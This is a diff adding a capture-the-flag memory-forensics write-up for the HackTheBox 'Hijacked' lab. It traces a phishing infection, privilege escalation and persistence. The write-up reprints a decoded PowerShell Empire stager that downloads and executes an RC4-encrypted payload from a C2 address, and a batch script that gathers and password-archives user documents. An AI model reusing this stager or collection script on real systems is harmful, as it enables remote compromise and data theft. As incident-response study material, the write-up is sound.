@@ -1524,3 +1524,390 @@ According to the above answer:
 ![image](https://hackmd.io/_uploads/B1HMGD12fe.png)
 
 **Answer:** `DESKTOP-887GK2L\DESKTOP-887GK2L\Users\CyberJunkie\Desktop\Forela-Triage-Workstation\Acquisiton and Triage tools`
+
+### XVIII. Hijacked:
+> - Link lab: https://app.hackthebox.com/sherlocks/Hijacked?tab=play_sherlock
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/BkLxUwk3zg.png)
+
+#### 1. What is the PID of the malicious process that gave the threat actor initial access?
+Using Volatility 3 and checking for plugin `windows.pstree`, I saw this process, whose PID is `9620`:
+![image](https://hackmd.io/_uploads/BJ4xiUG3ze.png)
+According to [about_PowerShell_exe](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1), `-noP`, `-sta`, `-w 1`, `-enc` respectively are `-NoProfile`, `single-threaded apartment`, `-WindowStyle` and:
+![image](https://hackmd.io/_uploads/H1zj28MnMe.png)
+So I will decode the above base64 command as UTF-16LE format:
+![image](https://hackmd.io/_uploads/rkTraUz3Gl.png)
+Make it readable:
+``` powershell
+If($PSVersionTable.PSVersion.Major -ge 3){};
+[System.Net.ServicePointManager]::Expect100Continue=0;
+$wc=New-Object System.Net.WebClient;
+
+$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA0ADMALgAyADAANAAuADIAMgA4AC4AOQA2ADoAMgA0AA==')));
+$t='/news.php';
+$wc.Headers.Add('User-Agent',$u);
+$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+$Script:Proxy = $wc.Proxy;
+
+$K=[System.Text.Encoding]::ASCII.GetBytes('y_NMoPemWH/&<R?4Y,7!paV%)~9bZj:J');
+$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
+    $S[$_],$S[$J]=$S[$J],$S[$_]};
+    $D|%{$I=($I+1)%256;
+        $H=($H+$S[$I])%256;
+        $S[$I],$S[$H]=$S[$H],$S[$I];
+        $_-bxor$S[($S[$I]+$S[$H])%256]}};
+$wc.Headers.Add("Cookie","mijBaAUUWrLhhrDE=kjV0i/ubzY9aHKpHnih78IFMdWE=");
+
+$data=$wc.DownloadData($ser+$t);
+$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
+```
+Decode the base64 string in `$ser`, we get an URL of C2 server: `http://43.204.228.96:24`. The above script fake the user agent, add the session cookie, then generate an RC4 and download `http://43.204.228.96:24/news.php`, finally it decode the shell and execute it.
+
+**Answer:** `9620`
+
+#### 2. There is no evidence of an email client being used. Which application did Happy Grunwald use to read the emails?
+When checking for `pslist`, I saw that there is a lot of procceses of `firefox.exe`, so I tried to dump the process have the most thread:
+![image](https://hackmd.io/_uploads/HyzKpDfhzl.png)
+Then filter some keywords related to email (like `mail`, or `@`):
+![image](https://hackmd.io/_uploads/BJ8NaDM2fx.png)
+![image](https://hackmd.io/_uploads/ryWGawGhGg.png)
+![image](https://hackmd.io/_uploads/S1Z-Juzhze.png)
+These evidence indicates that Happy Grunwald use FireFox to read his emails.
+
+**Answer:** `firefox`
+
+#### 3. Happy told the security team that the email was from a System Administrator, so he immediately opened the attachment. What is the email address that sent the phishing email?
+Find all of email addresses existing on the FireFox's process, then count how many times each one appear:
+``` ubuntu
+strings -a "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" | grep -aiE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_ascii.txt"
+strings -a -el "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" | grep -aiE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_u16.txt"
+cat "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_ascii.txt" "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_u16.txt" | sort -u > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_all.txt"
+cat "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_all.txt" | grep -aoE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort | uniq -c | sort -rn > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_count.txt"
+```
+``` email
+25 happy.grunwald@forela.co.uk
+16 webcompat@mozilla.org.xpi
+16 webcompat@mozilla.org
+16 default-theme@mozilla.org
+14 screenshots@mozilla.org
+12 google@search.mozilla.org
+11 pictureinpicture@mozilla.org
+11 formautofill@mozilla.org
+10 wikipedia@search.mozilla.org
+10 pictureinpicture@mozilla.org.xpi
+10 bing@search.mozilla.org
+10 amazondotcom@search.mozilla.org
+10 addons-search-detection@mozilla.com
+9 happy.grunwald@forela.local
+9 formautofill@mozilla.org.xpi
+9 ddg@search.mozilla.org
+8 screenshots@mozilla.org.xpi
+7 pki@sk.ee
+5 icons@2x.png
+5 -colorway@mozilla.org
+4 webcompat-reporter@mozilla.org.xpi
+4 webcompat-reporter@mozilla.org
+4 translation-16@2x.png
+4 toolkit@mozilla.org
+4 noreply@zohoaccounts.com
+4 iridium@particlecore.github.io
+4 info@e-szigno.hu
+4 firefox-compact-dark@mozilla.org
+4 abuse@eu.zohocorp.com
+4 Admins@forela.local
+3 youtube-com@2x.png
+3 wikipedia-org@2x.png
+3 twitter-com@2x.png
+3 search-engine-placeholder@2x.png
+3 reddit-com@2x.png
+3 olivier.debroqueville@gmail.com
+3 mgxtranslator@magemagix.com
+3 gtranslatewins@mozilla.org
+3 google@search.mozilla.orgdefault
+3 google-com@2x.png
+3 geckoprofiler@mozilla.com
+3 firefox-alpenglow@mozilla.org
+3 facebook-com@2x.png
+3 enhancerforyoutube@maximerf.addons.mozilla.org
+3 duckduckgo-com@2x.svg
+3 bing-com@2x.svg
+3 amazon@2x.png
+3 alonzo.spire@forela.co.uk
+3 Administrator@forela.local
+2 zhihu-com@2x.png
+```
+I will overlook `happy.grunwald@forela.co.uk`, `happy.grunwald@forela.local`, and strings having `@mozilla` or something likes `com@2x` or is not an email. What remains:
+``` email
+4 noreply@zohoaccounts.com
+4 iridium@particlecore.github.io
+4 abuse@eu.zohocorp.com
+4 Admins@forela.local
+3 olivier.debroqueville@gmail.com
+3 alonzo.spire@forela.co.uk
+3 Administrator@forela.local
+```
+Check for the data around these emails:
+``` ubuntu
+strings -a "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/strings_ascii.txt"
+strings -a -el "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/strings_u16.txt"
+```
+``` ubuntu
+D="/mnt/c/Users/Ha Nguyen/Desktop/CTF"
+for e in "noreply@zohoaccounts.com" "iridium@particlecore.github.io" "abuse@eu.zohocorp.com" "Admins@forela.local" "olivier.debroqueville@gmail.com" "alonzo.spire@forela.co.uk" "Administrator@forela.local"; do
+  f=$(echo "$e" | cut -d@ -f1)
+  grep -a -F -B15 -A15 "$e" "$D/strings_u16.txt" > "$D/ctx_${f}_u16.txt"
+  grep -a -F -B15 -A15 "$e" "$D/strings_ascii.txt" > "$D/ctx_${f}_ascii.txt"
+done
+```
+We get these following files:
+![image](https://hackmd.io/_uploads/ByVk9jX2fl.png)
+Check for files whose size is not 0KB. In `ctx_alonzo.spire_u16.txt`:
+![image](https://hackmd.io/_uploads/H1ghoom2zg.png)
+There is a warning about file-downloading. So I think that this is the address of phishing email.
+
+**Answer:** `alonzo.spire@forela.co.uk`
+
+#### 4. What was the subject/topic of the phishing email?
+Using [Bulk extractor](https://forensics.wiki/bulk_extractor/) to analyse this `.dmp` file:
+![image](https://hackmd.io/_uploads/SyrNUlr2Mg.png)
+![image](https://hackmd.io/_uploads/Bkq_UeH3fl.png)
+There are 8960 emails here. Check the `email.txt` and filter `alonzo.spire@forela.co.uk`, I found some useful information:
+![image](https://hackmd.io/_uploads/B1UGOlS2fg.png)
+![image](https://hackmd.io/_uploads/r17cG-S2Mx.png)
+![image](https://hackmd.io/_uploads/rkY9_ZSnMl.png)
+I found the email content and the password of attachment, it's `forela1234` and `forela123`. Check for the information around `alonzo.spire@forela.co.uk`:
+``` ubuntu
+strings -a "$D/Dump.mem" | grep -a -B20 -A5 "alonzo.spire@forela.co.uk" | cut -c1-500 > "$D/dump_alonzo_ctx.txt"
+```
+![image](https://hackmd.io/_uploads/S1mPVzShMx.png)
+![image](https://hackmd.io/_uploads/r16OVfH2zg.png)
+I think that `Meeting with The New Operations team` is the subject of this email.
+
+**Answer:** `Meeting with The New Operations team`
+
+#### 5. Happy was going through a document at the time of the incident. What's the full path of the document?
+Check for `pslist` to find which application can used to open a document file, I saw this process:
+![image](https://hackmd.io/_uploads/S1QkmSIhfx.png)
+Check for its `cmdline`:
+![image](https://hackmd.io/_uploads/HkcgmrInGe.png)
+
+**Answer:** `C:\Users\happy.grunwald\Documents\C-level\Budget-Plan_Pakistan.docx`
+
+#### 6. Recover the document and find the Topic/heading of the document.
+Finding the offset of `Budget-Plan_Pakistan.docx` by using `filescan`, then dump it:
+![image](https://hackmd.io/_uploads/ryamHBLnGg.png)
+Read its content:
+![image](https://hackmd.io/_uploads/BJX1OrIhGg.png)
+Its topic is `Budget plan For 2023-Asia Expansion`.
+
+**Answer:** `Budget plan For 2023-Asia Expansion`
+
+#### 7. What's the expected date of start of business in Pakistan?
+According to `Budget-Plan_Pakistan.docx`:
+![image](https://hackmd.io/_uploads/HJX5tHU3Gl.png)
+
+**Answer:** `2023-09-15`
+
+#### 8. What's the name of the malicious attachment that led to the initial infection?
+We have known that the attachment is a `.zip` file, and victim downloaded and opened. There are two `WINRAR.EXE` processes, so I will check their `cmdline`:
+![image](https://hackmd.io/_uploads/SJyanH82Ml.png)
+The malicious attachment is `SystemHealthCheck.zip`.
+
+**Answer:** `SystemHealthCheck.zip`
+
+#### 9. What's the name of the malicious stager file that established C2 communication, giving the attacker a foothold?
+Finding `SystemHealthCheck.zip`:
+![image](https://hackmd.io/_uploads/SJ7Uf883Me.png)
+There is nothing here, but we can use Bulk Extractor to find the information related to `.zip` file:
+![image](https://hackmd.io/_uploads/SJDhlII2Me.png)
+I found this:
+![image](https://hackmd.io/_uploads/HkemGIL3zx.png)
+`.hta` is an executed file:
+![image](https://hackmd.io/_uploads/SkRAf8Lhzx.png)
+
+**Answer:** `SystemHealthCheck.hta`
+
+#### 10. To bypass email filters the attacker password protected the both of the zip files and provided the passwords to Happy. You are given the malicious attachment, but sadly Happy doesn't remember the passwords. Recover the passwords and provide them in the order given by the attacker, separated by a comma and a space.
+We found it before:
+![image](https://hackmd.io/_uploads/rkoAQUI3Mg.png)
+
+**Answer:** `forela1234, forela123`
+
+#### 11. Submit the MD5 hash of the stager file you retrieved.
+The challenge gaves me `First.zip`, so I will use `forela1234` to unzip it. After extracting, we have `Second.zip`, so using `forela123` to uzip this one. Then we get the stager file:
+![image](https://hackmd.io/_uploads/Hy_xrI83Ml.png)
+Check its MD5 hash:
+![image](https://hackmd.io/_uploads/Hyt4BL83Mx.png)
+
+**Answer:** `dd46189c153f8e3f4d34868df3f6511f`
+
+#### 12. Which C2 Framework was used by the attacker?
+Using DIE to find the program language of this stager file:
+![image](https://hackmd.io/_uploads/HyKrI8IhGl.png)
+Because it was written in HTML, so we can use Notepad to read its content:
+![image](https://hackmd.io/_uploads/rkJ9UUL2Ml.png)
+Decode the above base64 and make it readble:
+![image](https://hackmd.io/_uploads/S1j0UIIhGl.png)
+It is the script that we have found in task 1! When searching for `c2 framework powershell` on Google, I found this [link](https://www.stationx.net/how-to-use-powershell-empire/):
+![image](https://hackmd.io/_uploads/HkUBYIInzl.png)
+![image](https://hackmd.io/_uploads/SJx_tU82Ml.png)
+
+**Answer:** `Empire`
+
+#### 13. What is the PID of the process the threat actor abused for privilege escalation?
+On Virus Total:
+![image](https://hackmd.io/_uploads/SJad0LLnGx.png)
+As we can see, `svchost.exe` is an important part of these malicious process trees, but there are a lot of processes of `svchost.exe` in our challenge:
+![image](https://hackmd.io/_uploads/Hynlkv8hGe.png)
+Check the process tree of each `svchost.exe`, and I found these malicious processes:
+![image](https://hackmd.io/_uploads/Skd_-wUnze.png)
+```
+svchost.exe (PID: 4352)
+ └── rundll32.exe (PID: 3932)
+      └── cmd.exe (PID: 3444)
+           ├── TeamViewer.exe (PID: 5052)
+           └── conhost.exe (PID: 8028)
+```
+
+**Answer:** `4352`
+
+#### 14. What is the path of the malicious file that resulted in privilege escalation?
+Check `cmdline` of these above proceses:
+![image](https://hackmd.io/_uploads/Hk2KQPI3Gx.png)
+There is nothing here. Try to find if there is malicious `.dll` file loaded by `svchost.exe` by using `dlllist` plugin:
+![image](https://hackmd.io/_uploads/SyczXP8hMl.png)
+There are lots of `.dll` files, but there is only one whose location is in `C:\Users\happy.grunwald\AppData\Local\Temp\`:
+![image](https://hackmd.io/_uploads/rJQPQPUnMl.png)
+The malicious file is `Winsrvc.dll`.
+
+**Answer:** `C:\Users\happy.grunwald\AppData\Local\Temp\Winsrvc.dll`
+
+#### 15. What is the Mitre sub-technique ID with which the attacker escalated their privileges?
+I found this MITRE:
+![image](https://hackmd.io/_uploads/ByPkOwIhMx.png)
+![image](https://hackmd.io/_uploads/r1U7wPU2Ge.png)
+More information: https://attack.mitre.org/techniques/T1055/001/
+
+**Answer:** `T1055.001`
+
+#### 16. The attacker connected to 2 different C2 addresses. What was the C2 IP and port number pair which facilitated initial remote access to the threat actor?
+We have found the reverse shell in task 1:
+``` powersell
+If($PSVersionTable.PSVersion.Major -ge 3){};
+[System.Net.ServicePointManager]::Expect100Continue=0;
+$wc=New-Object System.Net.WebClient;
+
+$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA0ADMALgAyADAANAAuADIAMgA4AC4AOQA2ADoAMgA0AA==')));
+$t='/news.php';
+$wc.Headers.Add('User-Agent',$u);
+$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+$Script:Proxy = $wc.Proxy;
+
+$K=[System.Text.Encoding]::ASCII.GetBytes('y_NMoPemWH/&<R?4Y,7!paV%)~9bZj:J');
+$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
+    $S[$_],$S[$J]=$S[$J],$S[$_]};
+    $D|%{$I=($I+1)%256;
+        $H=($H+$S[$I])%256;
+        $S[$I],$S[$H]=$S[$H],$S[$I];
+        $_-bxor$S[($S[$I]+$S[$H])%256]}};
+$wc.Headers.Add("Cookie","mijBaAUUWrLhhrDE=kjV0i/ubzY9aHKpHnih78IFMdWE=");
+
+$data=$wc.DownloadData($ser+$t);
+$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
+```
+**Answer:** `43.204.228.96:24`
+
+#### 17. Hunt for the second C2 Address to which connection was made by a LOLBIN after escalating privileges.
+Find and dump `Winsrvc.dll` file:
+![image](https://hackmd.io/_uploads/SJ2SFDI3zx.png)
+![image](https://hackmd.io/_uploads/BkDLKDU2Ge.png)
+Its psecode:
+![image](https://hackmd.io/_uploads/r1lkgzjw2Gl.png)
+![image](https://hackmd.io/_uploads/SkngGjwnzg.png)
+![image](https://hackmd.io/_uploads/S1H-GsPhfe.png)
+![image](https://hackmd.io/_uploads/r1YMfjD3fg.png)
+This script used for Process Injection, in general, it will execute a shellcode in `&unk_7FF834F83000`:
+![image](https://hackmd.io/_uploads/rJxnziv3fe.png)
+Because we know `rundll32.exe` (PID: `3932`) is the DLL injection process, let's check if there has malware in this process:
+![image](https://hackmd.io/_uploads/SkPAmjwhGl.png)
+![image](https://hackmd.io/_uploads/S11eEjvnfe.png)
+There are two `PrivateMemory` having suspicious privilege: `PAGE_EXECUTE_READWRITE`; and I suscessfully dumped the two files of these memory areas.
+![image](https://hackmd.io/_uploads/rk2TEiv2Gl.png)
+The port is `4444` (such a beautiful and suspicious number). Beside that, if checking for `netscan` plugin, I found this malicious connect:
+![image](https://hackmd.io/_uploads/HkBJxiwnMl.png)
+This connection belongs to `rundll32.exe`, which is a part of privilege-escalating.
+
+**Answer:** `13.233.33.88:4444`
+
+#### 18. The attacker directly downloaded a script from a web server. What is the full URL from where it was downloaded?
+I thought the answer is `http://43.204.228.96:24/news.php`, but it was wrong. So Dump `3932` process and check if there is any link which contain `18.192.12.126` in its URL:
+![image](https://hackmd.io/_uploads/rJUKKhDnMx.png)
+We have to use `-el` because memory stores data in little-edian. Beside that:
+![image](https://hackmd.io/_uploads/HyeBD3D3Gx.png)
+But I cannot dump this file:
+![image](https://hackmd.io/_uploads/r1wMw2whfe.png)
+
+**Answer:** `http://13.127.18.201/SystemIntegrityCheck.bat`
+
+#### 19. The threat actor that performed the attack is known for automating the collection of documents and files from compromised systems. The threat actor named their operation against Forela "PK-OPR24." Our reverse engineer said that she found this string commented on multiple occurrences in the analysis of the malicious stager. Reverse the script and provide the file extensions that it collects, in the order they are presented in the code.
+Filter `PK-OPR24`, I have found some offsets containing this keyword:
+![image](https://hackmd.io/_uploads/B14ZMv5hGg.png)
+Check for lines around the first offset:
+![image](https://hackmd.io/_uploads/HkgyXv9hzx.png)
+This is a `.bat` script. Expand the information area to display full script:
+![image](https://hackmd.io/_uploads/r1YwXD9nMg.png)
+``` bat
+set "source=%userprofile%"
+set "destination=%temp%\LootDocs"
+#PK-OPR24
+if not exist "%destination%" mkdir "%destination%"
+for /r "%source%" %%a in (*.docx *.docm *.pdf *.xls *.txt *.ppt *.xlsx *.pptx) do (
+    copy "%%a" "%destination%"
+cd %TEMP%\LootDocs
+"C:\Program Files\WinRAR\Rar.exe" a Data -p rwajnkhgbdtyalmd
+pause
+```
+The document was copied to `%temp%\LootDocs`, then it was archived by `Rar.exe` with `rwajnkhgbdtyalmd` is the password. And these are some of documents in this archived file:
+![image](https://hackmd.io/_uploads/r1O4HPq3zl.png)
+
+**Answer:** `docx, docm, pdf, xls, txt, ppt, xlsx, pptx`
+
+#### 20. The threat actor archived the collected data using tools like WinRAR, RAR, etc., before exfiltrating it. What is the password with which the TA archived the collected data?
+According to the above task, we found that the password of the archived file is `rwajnkhgbdtyalmd`.
+
+**Answer:** `rwajnkhgbdtyalmd`
+
+#### 21. The threat actor is known to set up and use Remote Access tools. Which tool did the attacker set up for Persistence?
+According to task 13, we have this process tree:
+```
+svchost.exe (PID: 4352)
+ └── rundll32.exe (PID: 3932)
+      └── cmd.exe (PID: 3444)
+           ├── TeamViewer.exe (PID: 5052)
+           └── conhost.exe (PID: 8028)
+```
+`TeamViewer.exe` is a famous remote access tool:
+![image](https://hackmd.io/_uploads/rkGuM9o3Ml.png)
+
+**Answer:** `TeamViewer`
+
+#### 22. The threat actor created a backdoor user to establish a backup persistence mechanism. What are the credentials of this account?
+Check for all accounts existing on the computer:
+![image](https://hackmd.io/_uploads/Sk_c8co2fg.png)
+According to [Wikipedia](https://en.wikipedia.org/wiki/Security_Identifier), the RID RIDs greater than 1000 indicate an admin-defined principal. In the above picture, maybe `helpdesk` is the backdoor account. Using `hashcat` to crack the password of this account:
+![image](https://hackmd.io/_uploads/B1DPxoihMg.png)
+The password is `BILA@hud`.
+
+**Answer:** `helpdesk:BILA@hud`
+
+#### 23. What Threat Actor seems to be in question? External Research is required, so keep in mind things like some of the techniques you identified so far, the Region in which they operate, etc.
+Looking for `Pakistan` on MITRE:
+![image](https://hackmd.io/_uploads/SJkSSiohfl.png)
+![image](https://hackmd.io/_uploads/SyFnEoi2Gg.png)
+![image](https://hackmd.io/_uploads/BJGaEishze.png)
+![image](https://hackmd.io/_uploads/S1_xHoshGx.png)
+![image](https://hackmd.io/_uploads/HkvfSsonzl.png)
+
+**Answer:** `Mustang Panda`
